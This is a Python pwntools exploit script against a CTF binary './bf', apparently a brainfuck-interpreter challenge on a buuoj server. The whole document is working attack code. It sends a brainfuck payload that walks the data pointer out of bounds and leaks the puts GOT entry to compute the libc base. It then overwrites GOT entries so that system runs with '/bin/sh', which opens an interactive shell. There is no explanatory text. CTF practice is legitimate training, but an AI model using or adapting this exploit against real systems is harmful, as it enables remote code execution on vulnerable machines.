#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./bf'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',27604)
			elf=ELF(elfelf)
			libc=ELF('../../i386libc/x86_libc.so.6')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		pay='<'*0x88+'.>'*4+'>'*0x10+',>'*8+'<'*0x24+',>'*4+'.'
		# gdb.attach(io,'b getchar')
		io.recv()
		io.sendline(pay)
		libc_base=u32(io.recv(4))-libc.sym['puts']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		io.send(p32(libc.sym['gets'])+p32(0x080484E0)+p32(system_addr))

		io.sendline('/bin/sh\x00')

		# success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue